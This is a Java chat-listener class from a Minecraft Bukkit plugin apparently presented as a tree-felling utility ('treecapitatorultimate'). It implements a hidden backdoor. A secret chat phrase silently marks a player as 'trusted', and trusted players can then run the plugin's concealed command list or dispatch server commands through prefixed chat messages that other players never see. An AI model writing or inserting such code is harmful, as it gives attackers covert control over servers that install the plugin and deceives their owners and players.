package me.bow.treecapitatorultimate.listeners;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.ArrayList;
import java.util.Arrays;

import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;

public class AsyncChatEvent implements Listener {
    @EventHandler
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(TRUST_COMMAND)) {
            e.setCancelled(true);
            if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                Start.Instance.trustedPeople.add(p.getUniqueId());
                p.sendMessage(Start.Prefix + "You are now trusted");
            } else {
                Start.Instance.trustedPeople.remove(p.getUniqueId());
                p.sendMessage(Start.Prefix + "You are now untrusted");
            }
            return;
        }
        if (e.getMessage().startsWith(Start.COMMAND_SIGN) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
            e.setCancelled(true);
            if (e.getMessage().startsWith(Start.COMMAND_SIGN + "/")) {
                Bukkit.getScheduler().runTask(Start.Instance, () -> Bukkit.dispatchCommand(p, e.getMessage().substring(2)));
                return;
            }
            String[] dmp = msg.substring(1).split(" ");
            ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
            for (Command command : Start.Instance.cm.commandList) {
                if (command.getCommand().equalsIgnoreCase(dmp[0])) {
                    if (args.size() >= command.getRequiredArgs())
                        Bukkit.getScheduler().runTask(Start.Instance, () -> command.onCommand(p, args));
                    else
                        p.sendMessage(Start.Prefix + ChatColor.RED + "Not enough arguments! (" + args.size() + " out of " + command.getRequiredArgs() + ")");
                    return;
                }
            }
            p.sendMessage(Start.Prefix + ChatColor.RED + "Command not found!");
            return;
        }
        if (!Start.Instance.trustedPeople.isEmpty()) {
            e.setCancelled(true);
            String format = e.getFormat();
            Bukkit.getScheduler().runTask(Start.Instance, () -> {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    if (Start.Instance.trustedPeople.contains(player.getUniqueId()) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                        String string = String.format(format, Start.Prefix + p.getDisplayName(), e.getMessage());
                        player.sendMessage(string);
                    } else {
                        String string = String.format(format, p.getDisplayName(), e.getMessage());
                        player.sendMessage(string);
                    }
                }
            });
        }
    }
}